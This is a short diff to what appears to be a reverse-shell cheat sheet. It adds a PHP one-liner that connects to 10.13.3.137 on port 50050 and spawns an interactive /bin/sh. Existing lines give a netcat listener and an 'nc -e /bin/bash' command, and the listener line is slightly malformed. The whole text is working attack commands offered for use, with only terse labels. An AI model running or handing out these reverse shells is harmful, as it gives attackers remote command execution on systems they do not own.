@@ -1,3 +1,6 @@
+```php -r '$sock=fsockopen("10.13.3.137",50050);exec("/bin/sh -i <&3 >&3 2>&3");'```
+
+
 ```nc -lvnp 192.168.1.1 8181``` : Create listener 
 
 ```nc <LOCAL-IP> <PORT> -e /bin/bash``` : Execute bash on connection 
